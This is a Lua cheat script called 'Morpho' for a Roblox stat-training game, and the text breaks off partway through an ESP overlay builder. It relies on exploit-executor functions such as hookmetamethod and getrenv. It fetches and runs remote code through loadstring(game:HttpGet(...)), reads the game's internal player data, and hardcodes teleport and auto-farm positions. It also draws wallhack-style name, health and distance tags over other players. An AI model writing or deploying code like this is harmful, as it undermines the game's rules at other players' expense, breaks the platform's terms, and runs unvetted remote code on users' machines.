---@diagnostic disable

repeat
    task.wait()
until game:IsLoaded()

local FireTouchInterest = firetouchinterest or function(FirstObject, SecondObject, Bool)
    SecondObject:PivotTo(FirstObject:GetPivot())
end

local IsNetworkOwner = isnetworkowner or function(_)
    return true
end

local CloneReference = cloneref or function(Instance)
    return Instance
end

local Request = request or http_request
local InjectorName = identifyexecutor and identifyexecutor() or "Unknown"

local SupportCheck = getsenv
    and newcclosure
    and checkcaller
    and hookmetamethod
    and hookfunction
    and getnamecallmethod
    and not string.find(InjectorName, "NX")
    and not string.find(InjectorName, "Xeno")

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/main/Library.lua"))()
local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/addons/SaveManager.lua"))()

local Options = Library.Options
local Toggles = Library.Toggles

Library.ForceCheckbox = false
Library.ShowToggleFrameInKeybinds = true

local Loading = Library:CreateLoading({
    Title = "Morpho",
    Icon = "square-parking",
    LoadingIcon = "loader",
    TotalSteps = 7,
})

Loading:SetMessage("Morpho")
Loading:SetDescription("System initialization in progress...")
task.wait(0.5)

Loading:SetCurrentStep(1)
Loading:SetMessage("Loading Core Framework")
Loading:SetDescription("Initializing internal modules...")
task.wait(0.6)

local Framework = {
    Dependencies = { Utilities = {} },
    Network = { Events = {}, Functions = {} },
    Configuration = { ClientData = {} },
    Runtime = { Connections = {} },
}

do
    local ServiceUtility = setmetatable({}, {
        __index = function(self, ServiceName)
            local Raw = rawget(self, ServiceName)
            return Raw or CloneReference(game:GetService(ServiceName))
        end,
    })
    Framework.Dependencies.Utilities.Services = ServiceUtility
end

do
    local InstanceUtility = {}

    function InstanceUtility:Create(ClassName, PropertyTable, ...)
        local NewInstance = Instance.new(ClassName)
        local Arguments = { ... }

        if PropertyTable then
            for Property, Value in PropertyTable do
                if Property ~= "Parent" then
                    NewInstance[Property] = Value
                end
            end
        end

        for _, Argument in Arguments do
            if typeof(Argument) == "Instance" then
                NewInstance.Parent = Argument
            elseif typeof(Argument) == "table" then
                for _, Child in Argument do
                    if typeof(Child) == "Instance" then
                        Child.Parent = NewInstance
                    end
                end
            end
        end

        return NewInstance
    end

    Framework.Dependencies.Utilities.Instance = InstanceUtility
end

do
    local MathUtility = {}

    local SuffixList = {
        "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc", "Ud", "Dd", "Td",
        "Qad", "Qid", "Sxd", "Spd", "Ocd", "Nod", "Vg", "Uvg", "Dvg", "Tvg",
    }

    local SuffixMapping = table.create(#SuffixList)
    for Index, Suffix in SuffixList do
        SuffixMapping[Suffix] = Index
    end

    function MathUtility:FormatNumber(Input)
        if typeof(Input) == "number" then
            local AbsoluteValue = math.abs(Input)

            if AbsoluteValue < 1000 then
                return (Input % 1 == 0) and tostring(Input) or string.format("%.2f", Input):gsub("%.?0+$", "")
            end

            local SuffixIndex = math.min(math.floor(math.log10(AbsoluteValue) / 3), #SuffixList)
            local Divisor = 10 ^ (SuffixIndex * 3)
            local Formatted = string.format("%.2f", Input / Divisor):gsub("%.?0+$", "")

            return Formatted .. SuffixList[SuffixIndex]
        elseif typeof(Input) == "string" then
            local CleanInput = Input:gsub(",", "")
            local NumberString, Suffix = CleanInput:match("([%d%.]+)%s*(%a+)")

            if NumberString and Suffix and SuffixMapping[Suffix] then
                return tonumber(NumberString) * (10 ^ (SuffixMapping[Suffix] * 3))
            end

            local OnlyNumber = CleanInput:match("[%d%.]+")
            return OnlyNumber and tonumber(OnlyNumber) or nil
        end

        return nil
    end

    function MathUtility:FormatTime(Time)
        local Days = math.floor(Time / 86400)
        local Hours = math.floor((Time % 86400) / 3600)
        local Minutes = math.floor((Time % 3600) / 60)
        local Seconds = math.floor(Time % 60)
        local Parts = {}

        if Days > 0 then table.insert(Parts, Days .. "d") end
        if Hours > 0 then table.insert(Parts, Hours .. "h") end
        if Minutes > 0 then table.insert(Parts, Minutes .. "m") end
        table.insert(Parts, Seconds .. "s")

        return table.concat(Parts, " : ")
    end

    Framework.Dependencies.Utilities.Maths = MathUtility
end

do
    local Network = Framework.Network
    local NetworkUtility = {}

    function NetworkUtility:FireServer(EventName, ...)
        return Network.Events[EventName]:FireServer(...)
    end

    function NetworkUtility:InvokeServer(FunctionName, ...)
        return Network.Functions[FunctionName]:InvokeServer(...)
    end

    Framework.Dependencies.Utilities.Network = NetworkUtility
end

do
    local GameUtility = {}

    function GameUtility:ParseColor(Color)
        return {
            Red = math.round(Color.R * 255),
            Green = math.round(Color.G * 255),
            Blue = math.round(Color.B * 255),
        }
    end

    function GameUtility:IsAlive(Player)
        Player = Player or game.Players.LocalPlayer
        local Character = Player.Character

        return Character
            and Character:FindFirstChild("Humanoid")
            and Character.Humanoid.RootPart
            and Character.Humanoid.Health > 0
    end

    function GameUtility:IsAuraEnabled(Character)
        for _, Object in Character:GetDescendants() do
            if Object:IsA("ParticleEmitter") and string.find(Object.Name:lower(), "aura") then
                return true
            end
        end
        return false
    end

    function GameUtility:CreateChatMessage(Text, Color, TextChatService)
        local ParsedColor = self:ParseColor(Color)
        local Red, Green, Blue = ParsedColor.Red, ParsedColor.Green, ParsedColor.Blue

        TextChatService.TextChannels.RBXSystem:DisplaySystemMessage(string.format(
            "<font face='GothamBold' color='rgb(%d, %d, %d)'>%s</font>",
            Red, Green, Blue, Text
        ))
    end

    function GameUtility:GetStatusUIProperty(Status, HeroFolder, VillainFolder, Titles, PropertyName)
        local HeroIndex = table.find(Titles.Hero, Status)
        local VillainIndex = table.find(Titles.Villain, Status)

        if HeroIndex then
            return HeroFolder[HeroIndex].NameTxt[PropertyName]
        elseif VillainIndex then
            return VillainFolder[VillainIndex].NameTxt[PropertyName]
        else
            return PropertyName == "TextColor3" and Color3.new(1, 1, 1) or Color3.new(0, 0, 0)
        end
    end

    function GameUtility:UpdateColor(Status, HeroFolder, VillainFolder, Titles)
        return self:GetStatusUIProperty(Status, HeroFolder, VillainFolder, Titles, "TextColor3")
    end

    function GameUtility:UpdateStrokeColor(Status, HeroFolder, VillainFolder, Titles)
        return self:GetStatusUIProperty(Status, HeroFolder, VillainFolder, Titles, "TextStrokeColor3")
    end

    function GameUtility:GetPositionFromThresholds(Stat, ThresholdList, SafeMode)
        for _, Entry in ThresholdList do
            if Stat >= Entry.Power then
                return SafeMode and Entry.Safe or Entry.Normal
            end
        end
        return nil
    end

    function GameUtility:GetFistStrengthPosition(StatThresholds)
        local FistStrength = Framework.Configuration.ClientData.FistStrength
        local MainQuest = Framework.Configuration.ClientData.QuestData.MainQuest.No
        local Position = self:GetPositionFromThresholds(
            FistStrength,
            StatThresholds.FistStrengthPositions,
            Toggles.SafeMode.Value
        )

        if Position then
            return Position
        end

        if MainQuest > 8 then
            return Toggles.SafeMode.Value
                and CFrame.new(-2276.88, 1936.37, 1049.87) * CFrame.Angles(math.rad(180), 0, 0)
                or CFrame.new(-2276.88, 1943.37, 1049.87)
        elseif MainQuest > 3 then
            return Toggles.SafeMode.Value
                and CFrame.new(410.98, 248.50, 979.57)
                or CFrame.new(410.98, 271.00, 979.57)
        end

        return nil
    end

    function GameUtility:GetBodyToughnessPosition(StatThresholds)
        local BodyToughness = Framework.Configuration.ClientData.BodyToughness
        return self:GetPositionFromThresholds(
            BodyToughness,
            StatThresholds.BodyToughnessPositions,
            Toggles.SafeMode.Value
        )
    end

    function GameUtility:GetPsychicPowerPosition(StatThresholds)
        local PsychicPower = Framework.Configuration.ClientData.PsychicPower
        return self:GetPositionFromThresholds(
            PsychicPower,
            StatThresholds.PsychicPowerPositions,
            Toggles.SafeMode.Value
        )
    end

    function GameUtility:GetMovementSpeedAndJumpForceArguments()
        local MovementSpeed = Framework.Configuration.ClientData.MovementSpeed
        local JumpForce = Framework.Configuration.ClientData.JumpForce

        if MovementSpeed > 1e7 and JumpForce > 1e7 then
            return { "EquipWeight_Request", 4 }
        elseif MovementSpeed > 567e3 and JumpForce > 21e5 then
            return { "EquipWeight_Request", 3 }
        elseif MovementSpeed > 5e3 and JumpForce > 21e4 then
            return { "EquipWeight_Request", 2 }
        elseif MovementSpeed > 1e2 and JumpForce > 5e3 then
            return { "EquipWeight_Request", 1 }
        end

        return nil
    end

    function GameUtility:GetSphere(StatThresholds)
        local FistStrength = Framework.Configuration.ClientData.FistStrength

        for Index = 1, #StatThresholds.FistStrengthLevels do
            if FistStrength >= StatThresholds.FistStrengthLevels[Index].Power then
                return StatThresholds.FistStrengthLevels[Index].Sphere
            end
        end

        return "EnergySphere1"
    end

    Framework.Dependencies.Utilities.Game = GameUtility
end

do
    local ListUtility = {}

    function ListUtility:RemoveFromList(List, Value)
        local Index = table.find(List, Value)
        if Index then
            table.remove(List, Index)
            return true
        end
        return false
    end

    function ListUtility:AddToList(List, Value)
        if not table.find(List, Value) then
            table.insert(List, Value)
            return true
        end
        return false
    end

    function ListUtility:ClearList(List)
        for Index = #List, 1, -1 do
            table.remove(List, Index)
        end
    end

    Framework.Dependencies.Utilities.List = ListUtility
end

Loading:SetCurrentStep(2)
Loading:SetMessage("Loading Dependencies")
Loading:SetDescription("Resolving utility modules...")
task.wait(0.5)

local Network = Framework.Network
local InstanceUtility = Framework.Dependencies.Utilities.Instance
local MathUtility = Framework.Dependencies.Utilities.Maths
local NetworkUtility = Framework.Dependencies.Utilities.Network
local ServiceUtility = Framework.Dependencies.Utilities.Services
local GameUtility = Framework.Dependencies.Utilities.Game
local ListUtility = Framework.Dependencies.Utilities.List

local PlayersService = ServiceUtility.Players
local WorkspaceService = ServiceUtility.Workspace
local RunService = ServiceUtility.RunService
local ReplicatedStorage = ServiceUtility.ReplicatedStorage
local UserInputService = ServiceUtility.UserInputService
local HttpService = ServiceUtility.HttpService
local GuiService = ServiceUtility.GuiService
local TeleportService = ServiceUtility.TeleportService
local TextChatService = ServiceUtility.TextChatService
local TweenService = ServiceUtility.TweenService
local CoreGui = ServiceUtility.CoreGui
local LightingService = ServiceUtility.Lighting
local VirtualUser = ServiceUtility.VirtualUser
local StarterGui = ServiceUtility.StarterGui

local LocalPlayer = PlayersService.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui
local PlayerList = PlayersService:GetPlayers()
local Camera = WorkspaceService.CurrentCamera
local Storage = WorkspaceService.Effects.MouseIgnoreGroup

local ScreenGui = PlayerGui.ScreenGui
local MenuFrame = ScreenGui.MenuFrame

local RemoteEvent = ReplicatedStorage.RemoteEvent
local RemoteFunction = ReplicatedStorage.RemoteFunction
local HeroFolder = ReplicatedStorage:WaitForChild("Rep_ChatNameColors"):WaitForChild("Hero")
local VillainFolder = ReplicatedStorage:WaitForChild("Rep_ChatNameColors"):WaitForChild("Villain")

local PlaceIdentifier = game.PlaceId
local JobIdentifier = game.JobId
local LatestVersion = game:HttpGet("https://pastebin.com/raw/WaapQS59")
local ScriptVersion = "7.0"
local ThreeDRenderingEnabled = true

local GameGlobals = (getrenv and InjectorName ~= "Solara" and not string.find(InjectorName, "NX") and not string.find(InjectorName, "Xeno")) and getrenv()._G or {
    ClientPlrData = setmetatable({}, {
        __index = function(_, Index)
            local Statistics = {
                FistStrength = MenuFrame.InfoFrame.FSTxt.Text,
                BodyToughness = MenuFrame.InfoFrame.BTTxt.Text,
                JumpForce = MenuFrame.InfoFrame.JFTxt.Text,
                MovementSpeed = MenuFrame.InfoFrame.MSTxt.Text,
                PsychicPower = MenuFrame.InfoFrame.PPTxt.Text,
                Token = ScreenGui.CurrentGemImgBtn.AmountTxtBtn.Text,
                QuestData = {
                    MainQuest = {
                        No = MenuFrame.SkillFrame.SkillTxt8.Text ~= "?????" and 9
                            or MenuFrame.SkillFrame.SkillTxt3.Text ~= "?????" and 4
                            or 0,
                    },
                },
            }
            return Index ~= "QuestData" and MathUtility:FormatNumber(Statistics[Index]) or Statistics[Index]
        end,
    }),
}

if IsMorphoLoaded then
    if setfpscap then setfpscap(60) end
    TeleportService:TeleportToPlaceInstance(PlaceIdentifier, JobIdentifier)
    Loading:SetMessage("Detected Another Instance Of Morpho")
    Loading:SetDescription("Reconnecting...")
    return
end

Framework.Configuration.ClientData = GameGlobals.ClientPlrData

local Globals = {
    PlayersData = {
        Esp = {},
        Targets = {},
        Whitelisted = {},
        CurrentTarget = PlayerList[math.random(1, #PlayerList)].Name,
    },
    GameConfiguration = {
        Health = { Respawn = 50 },
        Physics = { Gravity = 196.2 },
    },
    Titles = {
        Hero = {
            "Protector", "Guardian", "Superhero", "Punisher", "Lightbringer",
            "Saint", "Paragon", "Lionheart", "Chosen One", "Liberator",
            "One With Glory", "Wonderbringer", "Benefactor", "Executioner",
            "Morningstar", "Flames of Fire", "Blinding Lights", "Peace Dominion",
            "Constellations", "Supreme Unknown", "Eternal Life", "Savior of Worlds",
        },
        Villain = {
            "Lawbreaker", "Criminal", "Supervillain", "Devilish", "Satanic",
            "Hellish", "Death", "Archdemon", "The Devourer", "Wicked Revengers",
            "Soulcounter", "The Dark Sun", "Infernal Judge", "The Last Nemesis",
            "Minister of Chaos", "Great Disaster", "Ruler Of All Evil",
            "Inferno Furies", "Warmaster", "Lord of Calamity", "False God",
            "Harbringer of Doom",
        },
    },
    TeleportSystem = {
        Options = {
            "SafeZone", "LeaderBoards", "FS Rock", "FS Crystal", "FS 1B", "FS 100B", "FS 10T",
            "PP 1M", "PP 1B", "PP 1T", "PP 1Qa",
            "BT 100", "BT 10K", "BT 100K", "BT 1M", "BT 10M", "BT 1B", "BT 100B", "BT 10T",
        },
        Locations = {
            SafeZone = CFrame.new(471, 249, 889),
            LeaderBoards = CFrame.new(-766, 249, 750),
            ["FS Rock"] = CFrame.new(382, 249, 971),
            ["FS Crystal"] = CFrame.new(-2273, 1943, 1048),
            ["FS 1B"] = CFrame.new(1176, 4789, -2293),
            ["FS 100B"] = CFrame.new(1381, 9274, 1648),
            ["FS 10T"] = CFrame.new(-363, 15735, -3),
            ["PP 1M"] = CFrame.new(-2527, 5486, -532),
            ["PP 1B"] = CFrame.new(-2560, 5500, -439),
            ["PP 1T"] = CFrame.new(-2582, 5516, -504),
            ["PP 1Qa"] = CFrame.new(-2544, 5412, -495),
            ["BT 100"] = CFrame.new(365, 249, -445),
            ["BT 10K"] = CFrame.new(349, 263, -490),
            ["BT 100K"] = CFrame.new(1640, 258, 2244),
            ["BT 1M"] = CFrame.new(-2307, 976, 1068),
            ["BT 10M"] = CFrame.new(-2024, 714, -1860),
            ["BT 1B"] = CFrame.new(-254, 286, 980),
            ["BT 100B"] = CFrame.new(-271, 281, 991),
            ["BT 10T"] = CFrame.new(-279, 281, 1007),
        },
    },
    AnimationPackages = {
        Astronaut = {
            { "run", "RunAnim", "rbxassetid://891636393" },
            { "walk", "WalkAnim", "rbxassetid://891636393" },
            { "jump", "JumpAnim", "rbxassetid://891627522" },
            { "idle", "Animation1", "rbxassetid://891621366" },
            { "idle", "Animation2", "rbxassetid://891633237" },
            { "fall", "FallAnim", "rbxassetid://891617961" },
            { "swim", "Swim", "rbxassetid://891639666" },
            { "swimidle", "SwimIdle", "rbxassetid://891663592" },
            { "climb", "ClimbAnim", "rbxassetid://891609353" },
        },
        Bubbly = {
            { "run", "RunAnim", "rbxassetid://910025107" },
            { "walk", "WalkAnim", "rbxassetid://910034870" },
            { "jump", "JumpAnim", "rbxassetid://910016857" },
            { "idle", "Animation1", "rbxassetid://910004836" },
            { "idle", "Animation2", "rbxassetid://910009958" },
            { "fall", "FallAnim", "rbxassetid://910001910" },
            { "swim", "Swim", "rbxassetid://910028158" },
            { "swimidle", "SwimIdle", "rbxassetid://910030921" },
            { "climb", "ClimbAnim", "rbxassetid://909997997" },
        },
        Cartoony = {
            { "run", "RunAnim", "rbxassetid://742638842" },
            { "walk", "WalkAnim", "rbxassetid://742640026" },
            { "jump", "JumpAnim", "rbxassetid://742637942" },
            { "idle", "Animation1", "rbxassetid://742637544" },
            { "idle", "Animation2", "rbxassetid://742638445" },
            { "fall", "FallAnim", "rbxassetid://742637151" },
            { "swim", "Swim", "rbxassetid://742639220" },
            { "swimidle", "SwimIdle", "rbxassetid://742639812" },
            { "climb", "ClimbAnim", "rbxassetid://742636889" },
        },
        Elder = {
            { "run", "RunAnim", "rbxassetid://845386501" },
            { "walk", "WalkAnim", "rbxassetid://845403856" },
            { "jump", "JumpAnim", "rbxassetid://845398858" },
            { "idle", "Animation1", "rbxassetid://845397899" },
            { "idle", "Animation2", "rbxassetid://845400520" },
            { "fall", "FallAnim", "rbxassetid://845396048" },
            { "swim", "Swim", "rbxassetid://845401742" },
            { "swimidle", "SwimIdle", "rbxassetid://845403127" },
            { "climb", "ClimbAnim", "rbxassetid://845392038" },
        },
        Knight = {
            { "run", "RunAnim", "rbxassetid://657564596" },
            { "walk", "WalkAnim", "rbxassetid://657552124" },
            { "jump", "JumpAnim", "rbxassetid://658409194" },
            { "idle", "Animation1", "rbxassetid://657595757" },
            { "idle", "Animation2", "rbxassetid://657568135" },
            { "fall", "FallAnim", "rbxassetid://657600338" },
            { "swim", "Swim", "rbxassetid://657560551" },
            { "swimidle", "SwimIdle", "rbxassetid://657557095" },
            { "climb", "ClimbAnim", "rbxassetid://658360781" },
        },
        Levitation = {
            { "run", "RunAnim", "rbxassetid://616010382" },
            { "walk", "WalkAnim", "rbxassetid://616013216" },
            { "jump", "JumpAnim", "rbxassetid://616008936" },
            { "idle", "Animation1", "rbxassetid://616006778" },
            { "idle", "Animation2", "rbxassetid://616008087" },
            { "fall", "FallAnim", "rbxassetid://616005863" },
            { "swim", "Swim", "rbxassetid://616011509" },
            { "swimidle", "SwimIdle", "rbxassetid://616012453" },
            { "climb", "ClimbAnim", "rbxassetid://616003713" },
        },
        Mage = {
            { "run", "RunAnim", "rbxassetid://707861613" },
            { "walk", "WalkAnim", "rbxassetid://707897309" },
            { "jump", "JumpAnim", "rbxassetid://707853694" },
            { "idle", "Animation1", "rbxassetid://707742142" },
            { "idle", "Animation2", "rbxassetid://707855907" },
            { "fall", "FallAnim", "rbxassetid://707829716" },
            { "swim", "Swim", "rbxassetid://707876443" },
            { "swimidle", "SwimIdle", "rbxassetid://707894699" },
            { "climb", "ClimbAnim", "rbxassetid://707826056" },
        },
        Ninja = {
            { "run", "RunAnim", "rbxassetid://656118852" },
            { "walk", "WalkAnim", "rbxassetid://656121766" },
            { "jump", "JumpAnim", "rbxassetid://656117878" },
            { "idle", "Animation1", "rbxassetid://656117400" },
            { "idle", "Animation2", "rbxassetid://656118341" },
            { "fall", "FallAnim", "rbxassetid://656115606" },
            { "swim", "Swim", "rbxassetid://656119721" },
            { "swimidle", "SwimIdle", "rbxassetid://656121397" },
            { "climb", "ClimbAnim", "rbxassetid://656114359" },
        },
        Pirate = {
            { "run", "RunAnim", "rbxassetid://750783738" },
            { "walk", "WalkAnim", "rbxassetid://750785693" },
            { "jump", "JumpAnim", "rbxassetid://750782230" },
            { "idle", "Animation1", "rbxassetid://750781874" },
            { "idle", "Animation2", "rbxassetid://750782770" },
            { "fall", "FallAnim", "rbxassetid://750780242" },
            { "swim", "Swim", "rbxassetid://750784579" },
            { "swimidle", "SwimIdle", "rbxassetid://750785176" },
            { "climb", "ClimbAnim", "rbxassetid://750779899" },
        },
        Robot = {
            { "run", "RunAnim", "rbxassetid://616091570" },
            { "walk", "WalkAnim", "rbxassetid://616095330" },
            { "jump", "JumpAnim", "rbxassetid://616090535" },
            { "idle", "Animation1", "rbxassetid://616088211" },
            { "idle", "Animation2", "rbxassetid://616089559" },
            { "fall", "FallAnim", "rbxassetid://616087089" },
            { "swim", "Swim", "rbxassetid://616092998" },
            { "swimidle", "SwimIdle", "rbxassetid://616094091" },
            { "climb", "ClimbAnim", "rbxassetid://616086039" },
        },
        Rthro = {
            { "run", "RunAnim", "rbxassetid://2510198475" },
            { "walk", "WalkAnim", "rbxassetid://2510202577" },
            { "jump", "JumpAnim", "rbxassetid://2510197830" },
            { "idle", "Animation1", "rbxassetid://2510197257" },
            { "idle", "Animation2", "rbxassetid://2510196951" },
            { "fall", "FallAnim", "rbxassetid://2510195892" },
            { "swim", "Swim", "rbxassetid://2510199791" },
            { "swimidle", "SwimIdle", "rbxassetid://2510201162" },
            { "climb", "ClimbAnim", "rbxassetid://2510192778" },
        },
        Stylish = {
            { "run", "RunAnim", "rbxassetid://616140816" },
            { "walk", "WalkAnim", "rbxassetid://616146177" },
            { "jump", "JumpAnim", "rbxassetid://616139451" },
            { "idle", "Animation1", "rbxassetid://616136790" },
            { "idle", "Animation2", "rbxassetid://616138447" },
            { "fall", "FallAnim", "rbxassetid://616134815" },
            { "swim", "Swim", "rbxassetid://616143378" },
            { "swimidle", "SwimIdle", "rbxassetid://616144772" },
            { "climb", "ClimbAnim", "rbxassetid://616133594" },
        },
        Superhero = {
            { "run", "RunAnim", "rbxassetid://616117076" },
            { "walk", "WalkAnim", "rbxassetid://616122287" },
            { "jump", "JumpAnim", "rbxassetid://616115533" },
            { "idle", "Animation1", "rbxassetid://616111295" },
            { "idle", "Animation2", "rbxassetid://616113536" },
            { "fall", "FallAnim", "rbxassetid://616108001" },
            { "swim", "Swim", "rbxassetid://616119360" },
            { "swimidle", "SwimIdle", "rbxassetid://616120861" },
            { "climb", "ClimbAnim", "rbxassetid://616104706" },
        },
        Toy = {
            { "run", "RunAnim", "rbxassetid://782842708" },
            { "walk", "WalkAnim", "rbxassetid://782843345" },
            { "jump", "JumpAnim", "rbxassetid://782847020" },
            { "idle", "Animation1", "rbxassetid://782841498" },
            { "idle", "Animation2", "rbxassetid://782845736" },
            { "fall", "FallAnim", "rbxassetid://782846423" },
            { "swim", "Swim", "rbxassetid://782844582" },
            { "swimidle", "SwimIdle", "rbxassetid://782845186" },
            { "climb", "ClimbAnim", "rbxassetid://782843869" },
        },
        Vampire = {
            { "run", "RunAnim", "rbxassetid://1083462077" },
            { "walk", "WalkAnim", "rbxassetid://1083473930" },
            { "jump", "JumpAnim", "rbxassetid://1083455352" },
            { "idle", "Animation1", "rbxassetid://1083445855" },
            { "idle", "Animation2", "rbxassetid://1083450166" },
            { "fall", "FallAnim", "rbxassetid://1083443587" },
            { "swim", "Swim", "rbxassetid://1083464683" },
            { "swimidle", "SwimIdle", "rbxassetid://1083467779" },
            { "climb", "ClimbAnim", "rbxassetid://1083439238" },
        },
        Werewolf = {
            { "run", "RunAnim", "rbxassetid://1083216690" },
            { "walk", "WalkAnim", "rbxassetid://1083178339" },
            { "jump", "JumpAnim", "rbxassetid://1083218792" },
            { "idle", "Animation1", "rbxassetid://1083195517" },
            { "idle", "Animation2", "rbxassetid://1083214717" },
            { "fall", "FallAnim", "rbxassetid://1083189019" },
            { "swim", "Swim", "rbxassetid://1083222527" },
            { "swimidle", "SwimIdle", "rbxassetid://1083225406" },
            { "climb", "ClimbAnim", "rbxassetid://1083182000" },
        },
        Zombie = {
            { "run", "RunAnim", "rbxassetid://616163682" },
            { "walk", "WalkAnim", "rbxassetid://616168032" },
            { "jump", "JumpAnim", "rbxassetid://616161997" },
            { "idle", "Animation1", "rbxassetid://616158929" },
            { "idle", "Animation2", "rbxassetid://616160636" },
            { "fall", "FallAnim", "rbxassetid://616157476" },
            { "swim", "Swim", "rbxassetid://616165109" },
            { "swimidle", "SwimIdle", "rbxassetid://616166655" },
            { "climb", "ClimbAnim", "rbxassetid://616156119" },
        },
    },
    States = {
        PlayerPosition = nil,
        CameraPosition = nil,
        PsychicPowerCheck = true,
    },
}

local StatThresholds = {
    FistStrength = {
        [1] = 1e13,
        [2] = 1e11,
        [3] = 1e9,
    },
    BodyToughness = {
        [1] = 5e11,
        [2] = 5e9,
        [3] = 5e7,
        [4] = 5e5,
        [5] = 5e4,
        [6] = 5e3,
        [7] = 5e2,
        [8] = 5,
    },
    PsychicPower = {
        [1] = 1e15,
        [2] = 1e12,
        [3] = 1e9,
        [4] = 1e6,
    },
    FistStrengthLevels = {
        { Power = 1e18, Sphere = "EnergySphere10" },
        { Power = 1e15, Sphere = "EnergySphere9" },
        { Power = 1e12, Sphere = "EnergySphere8" },
        { Power = 1e10, Sphere = "EnergySphere7" },
        { Power = 1e8, Sphere = "EnergySphere6" },
        { Power = 1e7, Sphere = "EnergySphere5" },
        { Power = 1e6, Sphere = "EnergySphere4" },
        { Power = 1e5, Sphere = "EnergySphere3" },
        { Power = 1e4, Sphere = "EnergySphere2" },
        { Power = 0, Sphere = "EnergySphere1" },
    },
    FistStrengthPositions = {
        { Power = 1e13, Safe = CFrame.new(-364.10, 15700.15, -7.32), Normal = CFrame.new(-364.10, 15735.15, -7.32) },
        { Power = 1e11, Safe = CFrame.new(1380.36, 9260.74, 1652.63) * CFrame.Angles(math.rad(180), 0, 0), Normal = CFrame.new(1380.36, 9273.74, 1652.63) },
        { Power = 1e9, Safe = CFrame.new(1175.30, 4775.25, -2293.05) * CFrame.Angles(math.rad(180), 0, 0), Normal = CFrame.new(1175.30, 4789.25, -2293.05) },
    },
    BodyToughnessPositions = {
        { Power = 5e11, Safe = CFrame.new(-292.40, 281.30, 1006.50) * CFrame.Angles(math.rad(180), math.rad(90), 0), Normal = CFrame.new(-278.40, 281.30, 1006.50) },
        { Power = 5e9, Safe = CFrame.new(-293.53, 281.11, 984.89) * CFrame.Angles(math.rad(180), 0, 0), Normal = CFrame.new(-275.53, 281.11, 991.48) },
        { Power = 5e7, Safe = CFrame.new(-249.60, 286.11, 985.20) * CFrame.Angles(math.rad(180), math.rad(90), 0), Normal = CFrame.new(-244.45, 287.11, 978.97) },
        { Power = 5e5, Safe = CFrame.new(-1970.79, 714.25, -1882.21), Normal = CFrame.new(-2024.79, 714.25, -1882.21) },
        { Power = 5e4, Safe = CFrame.new(-2297.46, 965.74, 1075.02) * CFrame.Angles(math.rad(180), 0, 0), Normal = CFrame.new(-2297.46, 976.74, 1075.02) },
        { Power = 5e3, Safe = CFrame.new(1652.00, 259.62, 2262.21), Normal = CFrame.new(1634.49, 259.62, 2248.21) },
        { Power = 5e2, Safe = CFrame.new(367.50, 262.00, -492.33) * CFrame.Angles(math.rad(180), 0, 0), Normal = CFrame.new(357.28, 263.74, -492.33) },
        { Power = 5, Safe = CFrame.new(375.40, 246.50, -450.50) * CFrame.Angles(math.rad(180), 0, 0), Normal = CFrame.new(367.77, 249.71, -444.75) },
    },
    PsychicPowerPositions = {
        { Power = 1e15, Safe = CFrame.new(-2528.08, 5396.33, -515.88), Normal = CFrame.new(-2545.08, 5412.33, -491.88) },
        { Power = 1e12, Safe = CFrame.new(-2603.78, 5517.39, -500.41), Normal = CFrame.new(-2581.78, 5516.39, -500.41) },
        { Power = 1e9, Safe = CFrame.new(-2578.86, 5502.88, -440.46) * CFrame.Angles(0, math.rad(90), 0), Normal = CFrame.new(-2561.86, 5500.88, -440.46) },
        { Power = 1e6, Safe = CFrame.new(-2546.78, 5486.39, -534.67) * CFrame.Angles(0, math.rad(90), 0), Normal = CFrame.new(-2529.78, 5486.39, -534.67) },
    },
}

local EspFolder = InstanceUtility:Create("Folder", { Name = "EspFolder" }, CoreGui)
local HighlightsFolder = InstanceUtility:Create("Folder", { Name = "HighlightsFolder" }, CoreGui)
local EspContainer = CoreGui.EspFolder
local HighlightsContainer = CoreGui.HighlightsFolder

local function CreateEsp(Player)
    task.spawn(function()
        InstanceUtility:Create("BillboardGui", {
            Name = Player.Name,
            Enabled = false,
            AlwaysOnTop = true,
            Size = UDim2.fromOffset(2, 2),
            ExtentsOffset = Vector3.new(0, 1, 0),
            StudsOffset = Vector3.new(0, 3, 0),
        }, EspContainer, {
            InstanceUtility:Create("Frame", {
                Name = "Frame",
                ZIndex = 10,
                BackgroundTransparency = 1,
                Size = UDim2.fromScale(5, 5),
            }, {
                InstanceUtility:Create("TextLabel", {
                    Name = "Names",
                    ZIndex = 10,
                    Text = Player.Name,
                    BackgroundTransparency = 1,
                    Position = UDim2.fromOffset(0, -55),
                    Size = UDim2.fromScale(1, 10),
                    Font = "GothamBold",
                    TextSize = 14,
                    TextStrokeTransparency = 0.5,
                    TextColor3 = GameUtility:UpdateColor(Player:WaitForChild("leaderstats"):WaitForChild("Status").Value, HeroFolder, VillainFolder, Globals.Titles),
                    TextStrokeColor3 = GameUtility:UpdateStrokeColor(Player:WaitForChild("leaderstats"):WaitForChild("Status").Value, HeroFolder, VillainFolder, Globals.Titles),
                }),
                InstanceUtility:Create("TextLabel", {
                    Name = "Distance",
                    ZIndex = 10,
                    Text = "Distance: 0",
                    BackgroundTransparency = 1,
                    Position = UDim2.fromOffset(0, -45),
                    Size = UDim2.fromScale(1, 10),
                    Font = "GothamBold",
                    TextColor3 = Color3.new(1, 1, 1),
                    TextSize = 14,
                    TextStrokeTransparency = 0.5,
                }),
                InstanceUtility:Create("TextLabel", {
                    Name = "Health",
                    ZIndex = 10,
                    Text = "Health: 0",
                    BackgroundTransparency = 1,
                    Position = UDim2.fromOffset(0, -35),
                    Size = UDim2.fromScale(1, 10),
                    Font = "GothamBold",
                    TextColor3 = Color3.new(1, 1, 1),
                    TextSize = 14,
                    TextStrokeTransparency = 0.5,
                }),
                InstanceUtility:Create("TextLabel", {
                    Name = "Body",
                    ZIndex = 10,
                    Text = "Body: 0",
                    BackgroundTransparency = 1,
                    Position = UDim2.fromOffset(0, -25),
                    Size = UDim2.fromScale(1, 10),
                    Font = "GothamBold",
                    TextColor3 = Color3.new(1, 1, 1),
                    TextSize = 14,
                    TextStrokeTransparency = 0.5,
                }),
                InstanceUtility:Create("TextLabel", {
                    Name = "Psychic",
                    ZIndex = 10,
                    Text = "Psychic: " .. (Globals.PlayersData.Esp[Player.Name] or "0"),
                    BackgroundTransparency = 1,
